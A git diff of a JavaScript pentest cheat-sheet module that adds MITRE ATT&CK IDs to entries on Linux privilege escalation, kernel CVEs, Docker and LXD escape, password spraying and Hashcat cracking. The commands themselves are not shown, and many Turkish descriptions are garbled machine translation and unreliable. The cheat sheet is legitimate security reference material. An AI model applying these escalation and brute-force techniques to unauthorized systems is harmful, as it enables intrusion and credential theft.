+            "attack": [
+              "T1053.003"
+            ]
           },
           {
             "title": "System Cron Jobs",
@@ -7819,7 +9079,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: system-wide crgörevleri üzerinde"
+            "desc_tr": "Kontrol et: system-wide crgörevleri üzerinde",
+            "attack": [
+              "T1053.003"
+            ]
           },
           {
             "title": "Find Writable Cron Scripts",
@@ -7828,7 +9091,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find cron scripts that are world-writable"
+            "desc_tr": "Find cron scripts that are world-writable",
+            "attack": [
+              "T1053.003"
+            ]
           },
           {
             "title": "Monitor Cron with pspy",
@@ -7853,7 +9119,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Works when cron runs: tar czf backup.tar.gz *",
-            "desc_tr": "İstismar et: r tar wildcard crgörevleri ile üzerinde içinde"
+            "desc_tr": "İstismar et: r tar wildcard crgörevleri ile üzerinde içinde",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "PATH Variable Exploitation",
@@ -7867,7 +9136,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Works when cron PATH includes writable directory or cron script uses relative paths",
-            "desc_tr": "İstismar et: r crgörevleri that calls commands full path üzerinde olmadan"
+            "desc_tr": "İstismar et: r crgörevleri that calls commands full path üzerinde olmadan",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Systemd Timer Enum",
@@ -7900,7 +9172,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetki yükselt: pythcap_setuid üzerinden ile üzerinde"
+            "desc_tr": "Yetki yükselt: pythcap_setuid üzerinden ile üzerinde",
+            "attack": [
+              "T1059.004",
+              "T1059.006",
+              "T1548.001"
+            ]
           },
           {
             "title": "cap_setuid Perl",
@@ -7909,7 +9186,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetki yükselt: perl cap_setuid üzerinden ile"
+            "desc_tr": "Yetki yükselt: perl cap_setuid üzerinden ile",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           },
           {
             "title": "cap_dac_read_search",
@@ -7918,7 +9199,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Read any file on the system"
+            "desc_tr": "Read any file on the system",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "cap_net_bind_service",
@@ -7927,7 +9211,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Bind privileged ports (<1024)'e"
+            "desc_tr": "Bind privileged ports (<1024)'e",
+            "attack": [
+              "T1059.006"
+            ]
           }
         ],
         "name_tr": "Linux Capabilities"
@@ -7946,7 +9233,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Add root user to writable passwd file"
+            "desc_tr": "Add root user to writable passwd file",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "World-Writable Files",
@@ -7979,7 +9269,11 @@ module.exports = [
               "essential"
             ],
             "note": "Only works if SUID binary calls commands without absolute path",
-            "desc_tr": "Hijack PATH for SUID binary relative command path kullanarak"
+            "desc_tr": "Hijack PATH for SUID binary relative command path kullanarak",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           },
           {
             "title": "Shared Library Hijack",
@@ -7993,7 +9287,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Find shared library misconfigurations"
+            "desc_tr": "Find shared library misconfigurations",
+            "attack": [
+              "T1548.001"
+            ]
           }
         ],
         "name_tr": "Writable Files & PATH Hijack"
@@ -8009,7 +9306,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Suggest kernel exploits based kernel version üzerinde"
+            "desc_tr": "Suggest kernel exploits based kernel version üzerinde",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "Linux Exploit Suggester 2",
@@ -8018,7 +9318,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Alternative istismar suggester (Python)"
+            "desc_tr": "Alternative istismar suggester (Python)",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "DirtyPipe (CVE-2022-0847)",
@@ -8028,7 +9331,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Affects Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102",
-            "desc_tr": "Kernel istismar for Linux 5.8-5.16.11"
+            "desc_tr": "Kernel istismar for Linux 5.8-5.16.11",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "DirtyCow (CVE-2016-5195)",
@@ -8038,7 +9344,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Affects Linux kernel < 4.8.3",
-            "desc_tr": "Kernel istismar for race conditimemory management üzerinde içinde"
+            "desc_tr": "Kernel istismar for race conditimemory management üzerinde içinde",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "PwnKit (CVE-2021-4034)",
@@ -8048,7 +9357,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Affects most Linux distros with polkit installed (2009-2022)",
-            "desc_tr": "Polkit pkexec yerel yetki yükseltme"
+            "desc_tr": "Polkit pkexec yerel yetki yükseltme",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "Check Kernel Version for Exploits",
@@ -8067,7 +9379,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Affects Linux kernel >= 5.8",
-            "desc_tr": "Kernel istismar kimlik bilgileri swapping kullanarak"
+            "desc_tr": "Kernel istismar kimlik bilgileri swapping kullanarak",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "CVE-2023-0386 (OverlayFS)",
@@ -8106,7 +9421,10 @@ module.exports = [
               "essential"
             ],
             "note": "Versions before 0.120 are vulnerable to CVE-2021-4034",
-            "desc_tr": "Kontrol et: for PwnKit zafiyet(ler)"
+            "desc_tr": "Kontrol et: for PwnKit zafiyet(ler)",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "PwnKit CVE-2021-4034",
@@ -8118,7 +9436,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "pkexec yerel privesc"
+            "desc_tr": "pkexec yerel privesc",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "Sudo CVE-2019-14287",
@@ -8128,7 +9449,10 @@ module.exports = [
               "essential"
             ],
             "note": "Works on sudo < 1.8.28 with (ALL, !root) config",
-            "desc_tr": "Bypass sudo user restriction"
+            "desc_tr": "Bypass sudo user restriction",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Kernel Exploits"
@@ -8152,7 +9476,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Mount host filesystem to escape container"
+            "desc_tr": "Mount host filesystem to escape container",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Docker Socket Escape",
@@ -8161,7 +9488,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Escape açık Docker socket üzerinden"
+            "desc_tr": "Escape açık Docker socket üzerinden",
+            "attack": [
+              "T1059.004",
+              "T1611"
+            ]
           },
           {
             "title": "LXD Group Escape",
@@ -8208,7 +9539,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Escape privileged Docker container üzerinden"
+            "desc_tr": "Escape privileged Docker container üzerinden",
+            "attack": [
+              "T1059.004",
+              "T1611"
+            ]
           },
           {
             "title": "Docker Group Escape (Named Image)",
@@ -8226,7 +9561,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: if Docker socket is writable"
+            "desc_tr": "Kontrol et: if Docker socket is writable",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "LXD Group Escape (Quick)",
@@ -8240,7 +9578,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı LXD escape if already initialized"
+            "desc_tr": "Hızlı LXD escape if already initialized",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "LXD Import Alpine Image",
@@ -8272,7 +9613,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Disk group allows raw access to block devices",
-            "desc_tr": "Read raw filesystem if in disk group"
+            "desc_tr": "Read raw filesystem if in disk group",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "ADM Group Log Access",
@@ -8293,7 +9637,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Escape Docker group üzerinden"
+            "desc_tr": "Escape Docker group üzerinden",
+            "attack": [
+              "T1003.008",
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Docker & Container Escape"
@@ -8342,7 +9690,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Create SUID binary on NFS share as root"
+            "desc_tr": "Create SUID binary on NFS share as root",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           }
         ],
         "name_tr": "NFS Abuse"
@@ -8358,7 +9710,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kapsamlı Linux yetki yükseltme tarayıcı"
+            "desc_tr": "Kapsamlı Linux yetki yükseltme tarayıcı",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "LinPEAS (Uploaded)",
@@ -8368,7 +9723,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Run LinPEAS after uploading to target"
+            "desc_tr": "Run LinPEAS after uploading to target",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "LinEnum",
@@ -8407,7 +9765,10 @@ module.exports = [
               "tool"
             ],
             "note": "-a=all, -s=superfast, -e=extra checks",
-            "desc_tr": "Run LinPEAS with specific check categories"
+            "desc_tr": "Run LinPEAS with specific check categories",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "LinPrivChecker",
@@ -8435,7 +9796,11 @@ module.exports = [
               "essential"
             ],
             "note": "Always check GTFOBins for any unusual SUID binary or sudo permission",
-            "desc_tr": "Manual lookup for binary istismar"
+            "desc_tr": "Manual lookup for binary istismar",
+            "attack": [
+              "T1548.003",
+              "T1548.001"
+            ]
           }
         ],
         "name_tr": "Automated Scanners"
@@ -8459,7 +9824,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find SSH private keys"
+            "desc_tr": "Find SSH private keys",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Web App Configs",
@@ -8471,7 +9839,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find configs with passwords"
+            "desc_tr": "Find configs with passwords",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Find Database Files",
@@ -8524,7 +9895,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra FTP Brute Force",
@@ -8534,7 +9908,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra HTTP POST Form",
@@ -8545,7 +9922,10 @@ module.exports = [
               "tool"
             ],
             "note": "Adjust form fields and failure string to match target",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logform (POST) içinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logform (POST) içinde",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra HTTP GET Basic Auth",
@@ -8555,7 +9935,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic kimlik doğrulama"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic kimlik doğrulama",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra RDP Brute Force",
@@ -8564,7 +9947,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SMB Brute Force",
@@ -8573,7 +9959,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra MySQL Brute Force",
@@ -8582,7 +9971,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra MSSQL Brute Force",
@@ -8591,7 +9983,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra POP3 Brute Force",
@@ -8600,7 +9995,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra IMAP Brute Force",
@@ -8609,7 +10007,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SMTP Brute Force",
@@ -8618,7 +10019,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra VNC Brute Force",
@@ -8627,7 +10031,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra Telnet Brute Force",
@@ -8636,7 +10043,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Telnet login"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Telnet login",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra with User List",
@@ -8646,7 +10056,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı username and password lists ile"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı username and password lists ile",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Medusa SSH Brute Force",
@@ -8655,7 +10068,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "SSH için Medusa paralel kaba kuvvet aracı"
+            "desc_tr": "SSH için Medusa paralel kaba kuvvet aracı",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Ncrack RDP Brute Force",
@@ -8664,7 +10080,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "RDP için Ncrack kaba kuvvet aracı"
+            "desc_tr": "RDP için Ncrack kaba kuvvet aracı",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Ncrack SSH Brute Force",
@@ -8673,7 +10092,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "SSH için Ncrack kaba kuvvet aracı"
+            "desc_tr": "SSH için Ncrack kaba kuvvet aracı",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Ncrack FTP Brute Force",
@@ -8682,7 +10104,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "FTP için Ncrack kaba kuvvet aracı"
+            "desc_tr": "FTP için Ncrack kaba kuvvet aracı",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SNMP Community Brute",
@@ -8691,7 +10116,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP community strings"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP community strings",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra HTTP POST JSON",
@@ -8701,7 +10129,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı JSAPI logendpoint üzerinde içinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı JSAPI logendpoint üzerinde içinde",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra Multiple Targets",
@@ -8710,7 +10141,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı multiple targets genelinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı multiple targets genelinde",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Patator SSH Brute Force",
@@ -8719,7 +10153,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Parallel kaba kuvvet saldırısı patator ile"
+            "desc_tr": "Parallel kaba kuvvet saldırısı patator ile",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Patator HTTP POST Brute Force",
@@ -8728,7 +10165,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logpatator ile içinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logpatator ile içinde",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Crowbar RDP Brute Force",
@@ -8737,7 +10177,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP crowbar ile"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP crowbar ile",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Crowbar SSH Key Spray",
@@ -8746,7 +10189,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Spray SSH keys against a target"
+            "desc_tr": "Spray SSH keys against a target",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Hydra MySQL",
@@ -8755,7 +10201,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra MSSQL",
@@ -8764,7 +10213,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra VNC",
@@ -8773,7 +10225,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra POP3",
@@ -8782,7 +10237,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra IMAP",
@@ -8791,7 +10249,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SNMP",
@@ -8800,7 +10261,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SSH with SecLists",
@@ -8810,7 +10274,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH SecLists password file kullanarak"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH SecLists password file kullanarak",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra SSH High Threads",
@@ -8821,7 +10288,10 @@ module.exports = [
               "tool"
             ],
             "note": "High thread count may cause connection drops on some targets",
-            "desc_tr": "Hızlı SSH kaba kuvvet saldırısı 64 parallel threads ile"
+            "desc_tr": "Hızlı SSH kaba kuvvet saldırısı 64 parallel threads ile",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Hydra FTP Single Cred Test",
@@ -8830,7 +10300,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: a single kimlik bilgileri pair FTP'e karşı"
+            "desc_tr": "Test et: a single kimlik bilgileri pair FTP'e karşı",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "CrackMapExec SSH Spray",
@@ -8840,7 +10313,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Spray credentials across subnet via SSH"
+            "desc_tr": "Spray credentials across subnet via SSH",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "CrackMapExec SSH User List",
@@ -8849,7 +10325,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Test et: multiple users single password SSH üzerinden ile"
+            "desc_tr": "Test et: multiple users single password SSH üzerinden ile",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Kerbrute User Enum",
@@ -8858,7 +10337,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Active Directory kullanıcılarını listele"
+            "desc_tr": "Active Directory kullanıcılarını listele",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Kerbrute Password Spray",
@@ -8867,7 +10349,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Spray password"
+            "desc_tr": "Spray password",
+            "attack": [
+              "T1110.003"
+            ]
           }
         ],
         "name_tr": "Online Brute Force"
@@ -8883,7 +10368,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack MD5 hashes"
+            "desc_tr": "Crack MD5 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat SHA1",
@@ -8893,7 +10381,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack SHA1 hashes"
+            "desc_tr": "Crack SHA1 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat MD5Crypt",
@@ -8903,7 +10394,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack Linux MD5 crypt ($1$)"
+            "desc_tr": "Crack Linux MD5 crypt ($1$)",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat NTLM",
@@ -8913,7 +10407,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack Windows NTLM hashes"
+            "desc_tr": "Crack Windows NTLM hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat SHA256",
@@ -8923,7 +10420,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack SHA256 hashes"
+            "desc_tr": "Crack SHA256 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat SHA512",
@@ -8932,7 +10432,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack SHA512 hashes"
+            "desc_tr": "Crack SHA512 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat SHA512Crypt",
@@ -8942,7 +10445,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack Linux SHA512 crypt ($6$)"
+            "desc_tr": "Crack Linux SHA512 crypt ($6$)",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat bcrypt",
@@ -8951,7 +10457,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "bcrypt hash'lerini kır"
+            "desc_tr": "bcrypt hash'lerini kır",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat NetNTLMv2",
@@ -8961,7 +10470,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack NetNTLMv2 hashes (Responder captures)"
+            "desc_tr": "Crack NetNTLMv2 hashes (Responder captures)",
+            "attack": [
+              "T1110.002",
+              "T1557.001"
+            ]
           },
           {
             "title": "Hashcat NetNTLMv1",
@@ -8970,7 +10483,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack NetNTLMv1 hashes"
+            "desc_tr": "Crack NetNTLMv1 hashes",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Kerberoast (TGS-REP)",
@@ -8980,7 +10496,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack Kerberoasted service ticket hashes"
+            "desc_tr": "Crack Kerberoasted service ticket hashes",
+            "attack": [
+              "T1558.003",
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat AS-REP Roast",
@@ -8990,7 +10510,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "AS-REP roasting hash'lerini kır"
+            "desc_tr": "AS-REP roasting hash'lerini kır",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat WPA2",
@@ -8999,7 +10522,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack WPA2 handshake"
+            "desc_tr": "Crack WPA2 handshake",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Kerberos 5 TGS-REP RC4",
@@ -9008,7 +10534,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack Kerberos 5 etype 23"
+            "desc_tr": "Crack Kerberos 5 etype 23",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Kerberos 5 TGS-REP AES256",
@@ -9017,7 +10546,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Crack Kerberos 5 etype 18"
+            "desc_tr": "Crack Kerberos 5 etype 18",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat MD4 (NTLM raw)",
@@ -9026,7 +10558,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack raw MD4/NTLM"
+            "desc_tr": "Crack raw MD4/NTLM",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat with Rules",
@@ -9036,7 +10571,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Crack using rule-based transformations"
+            "desc_tr": "Crack using rule-based transformations",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat OneRuleToRuleThemAll",
@@ -9045,7 +10583,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Crack with the most comprehensive rule"
+            "desc_tr": "Crack with the most comprehensive rule",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Mask Attack",
@@ -9056,7 +10597,10 @@ module.exports = [
               "tool"
             ],
             "note": "?u=upper ?l=lower ?d=digit ?s=special ?a=all",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı pattern mask ile"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı pattern mask ile",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Combinator Attack",
@@ -9065,7 +10609,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "İki kelime listesini birleştir"
+            "desc_tr": "İki kelime listesini birleştir",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Show Cracked",
@@ -9075,7 +10622,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Önceden kırılmış hash'leri göster"
+            "desc_tr": "Önceden kırılmış hash'leri göster",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Mask Attack (Custom)",
@@ -9086,7 +10636,10 @@ module.exports = [
               "tool"
             ],
             "note": "-1 defines custom charset 1, -2 defines charset 2",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı özel mask charset ile"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı özel mask charset ile",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Hybrid Wordlist+Mask",
@@ -9096,7 +10649,10 @@ module.exports = [
               "tool"
             ],
             "note": "Mode 6: wordlist+mask, Mode 7: mask+wordlist",
-            "desc_tr": "Append mask pattern kelime listesi entries'e"
+            "desc_tr": "Append mask pattern kelime listesi entries'e",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Hashcat Hybrid Mask+Wordlist",
